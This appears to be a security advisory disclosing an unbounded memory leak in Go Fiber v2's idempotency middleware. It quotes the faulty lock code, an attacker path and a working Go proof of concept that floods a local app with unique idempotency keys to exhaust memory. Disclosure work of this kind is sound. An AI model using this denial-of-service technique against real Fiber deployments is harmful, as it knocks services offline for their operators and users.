The `middleware/idempotency` package serialises concurrent requests carrying the same `X-Idempotency-Key` via a `Locker`. The default `Locker` implementation, `MemoryLock`, inserts a `*sync.Mutex` into an internal map on `Lock(key)` and never removes it — `Unlock(key)` releases the mutex but leaves the map entry in place, and no sweeper ever runs against this map. An unauthenticated client that can reach any route protected by `idempotency.New()` can send unsafe-method requests with unique 36-character `X-Idempotency-Key` values (the default validator only checks length) and permanently grow process heap by ~280–300 bytes per request for the lifetime of the server. At a sustained 1 000 req/s this leaks roughly 1 GB per hour with no recovery short of process restart.

### Details
**Affected versions:** `github.com/gofiber/fiber/v2` ≤ v2.52.13 (all v2 releases).

**Root cause**

`middleware/idempotency/locker.go` lines 19–45 (functions `Lock` / `Unlock`):

```go
func (l *MemoryLock) Lock(key string) error {
        l.mu.Lock()
        mu, ok := l.keys[key]
        if !ok {
                mu = new(sync.Mutex)
                l.keys[key] = mu
        }
        l.mu.Unlock()

        mu.Lock()

        return nil
}

func (l *MemoryLock) Unlock(key string) error {
        l.mu.Lock()
        mu, ok := l.keys[key]
        l.mu.Unlock()
        if !ok {
                // This happens if we try to unlock an unknown key
                return nil
        }

        mu.Unlock()

        return nil
}
```

`Lock` inserts `key → *sync.Mutex` into `l.keys`; `Unlock` never calls `delete(l.keys, key)`. The map has no separate GC goroutine.

`MemoryLock` is the default lock wired by `configDefault` at `middleware/idempotency/config.go` lines 82 and 115:

```go
cfg.Lock = NewMemoryLock()
```

By contrast the *response* cache (`cfg.Storage`) is a `memory.New(...)` store with a `GCInterval` sweeper — so cached responses do expire, but the per-key mutexes never do.

**Attacker path**

1. Application mounts the middleware with defaults: `app.Use(idempotency.New())`.
2. Attacker sends `POST /` (any non-safe method — the default `Next` only skips GET/HEAD/OPTIONS/TRACE) with header `X-Idempotency-Key: <any 36 characters>`.
3. The default `KeyHeaderValidate` (`middleware/idempotency/config.go` lines 61–67) accepts any 36-byte string — it enforces length only, not UUID syntax or entropy.
4. The middleware calls `cfg.Lock.Lock(key)` → new map entry; after the handler runs it calls `cfg.Lock.Unlock(key)` → mutex released, **map entry retained**.
5. Repeat with a fresh key on every request.

Each retained entry costs the map bucket slot, the 36-byte key string, and the `sync.Mutex` allocation — measured at ~286 bytes/key after a forced GC.

### PoC

```
go mod init poc && go get github.com/gofiber/fiber/v2@v2.52.13 && go run .
```

```go
package main

// Drives 50 000 POST requests with unique X-Idempotency-Key values through a
// default idempotency.New() handler, then inspects the unexported
// MemoryLock.keys map via reflection to show every entry is still present
// after the request completed and after a forced GC.

import (
        "fmt"
        "net/http/httptest"
        "reflect"
        "runtime"
        "unsafe"

        "github.com/gofiber/fiber/v2"
        "github.com/gofiber/fiber/v2/middleware/idempotency"
)

func main() {
        // Use the default in-process MemoryLock explicitly so we can inspect it
        // afterwards. configDefault would otherwise call NewMemoryLock() itself,
        // so behaviour is identical to idempotency.New() with no config.
        lock := idempotency.NewMemoryLock()

        app := fiber.New(fiber.Config{DisableStartupMessage: true})
        app.Use(idempotency.New(idempotency.Config{
                Lock: lock, // everything else: framework defaults
        }))
        app.Post("/", func(c *fiber.Ctx) error { return c.SendString("ok") })

        const N = 50000

        var msBefore runtime.MemStats
        runtime.GC()
        runtime.ReadMemStats(&msBefore)

        for i := 0; i < N; i++ {
                // 36-char key (passes default validator). Fully attacker controlled.
                key := fmt.Sprintf("%036d", i)
                req := httptest.NewRequest("POST", "/", nil)
                req.Header.Set("X-Idempotency-Key", key)
                resp, err := app.Test(req, -1)
                if err != nil {
                        panic(err)
                }
                _ = resp.Body.Close()
        }

        // Force GC so any legitimately freeable memory is reclaimed.
        runtime.GC()
        var msAfter runtime.MemStats
        runtime.ReadMemStats(&msAfter)

        // Inspect MemoryLock.keys via reflection (unexported field).
        rv := reflect.ValueOf(lock).Elem().FieldByName("keys")
        rv = reflect.NewAt(rv.Type(), unsafe.Pointer(rv.UnsafeAddr())).Elem()
        retained := rv.Len()

        fmt.Printf("requests sent          : %d\n", N)
        fmt.Printf("MemoryLock.keys entries: %d (expected ~0 if cleaned up)\n", retained)
        fmt.Printf("HeapAlloc before       : %d bytes\n", msBefore.HeapAlloc)
        fmt.Printf("HeapAlloc after  (GC'd): %d bytes\n", msAfter.HeapAlloc)
        fmt.Printf("HeapAlloc delta        : %d bytes (~%d bytes/key retained)\n",
                int64(msAfter.HeapAlloc)-int64(msBefore.HeapAlloc),
                (int64(msAfter.HeapAlloc)-int64(msBefore.HeapAlloc))/int64(N))

        if retained == N {
                fmt.Println("\nINVARIANT VIOLATED: per-key mutexes are never released; " +
                        "unauthenticated client can exhaust server memory by sending unique " +
                        "X-Idempotency-Key headers.")
        } else {
                fmt.Println("\nUNEXPECTED: lock map was cleaned up; finding may not apply.")
        }
}
```

Expected output:

```
requests sent          : 50000
MemoryLock.keys entries: 50000 (expected ~0 if cleaned up)
HeapAlloc before       : 342832 bytes
HeapAlloc after  (GC'd): 14687968 bytes
HeapAlloc delta        : 14345136 bytes (~286 bytes/key retained)

INVARIANT VIOLATED: per-key mutexes are never released; unauthenticated client can exhaust server memory by sending unique X-Idempotency-Key headers.
```

All 50 000 map entries survive after every request has been fully served and after `runtime.GC()`.

### Impact
Any Fiber v2 application that mounts `middleware/idempotency` with the default `Lock` (i.e. `idempotency.New()` or `idempotency.New(cfg)` with `cfg.Lock == nil`) is affected. The middleware is **opt-in** — it is not mounted by `fiber.New()` — so only applications that explicitly enable it are exposed.

An unauthenticated remote attacker who can reach any route behind the middleware with a non-safe HTTP method can:

- allocate ~280–300 bytes of unrecoverable heap per request by sending a unique 36-character `X-Idempotency-Key` header;
- sustain this to exhaust process memory (≈1 GB/hour at 1 000 req/s), eventually causing OOM-kill / service unavailability;
- the leaked memory is never reclaimed for the lifetime of the process, so even a low-rate attack accumulates indefinitely.

No authentication is required (unless the application places auth in front of the idempotency middleware). No special request body is needed. Rate-limiting mitigates but does not eliminate the leak, since every accepted request still adds a permanent entry.

**Suggested fix:** delete the map entry in `Unlock` (guarded so a concurrent `Lock` on the same key still works — e.g. reference-count each entry, or delete only when the mutex has no waiters), or
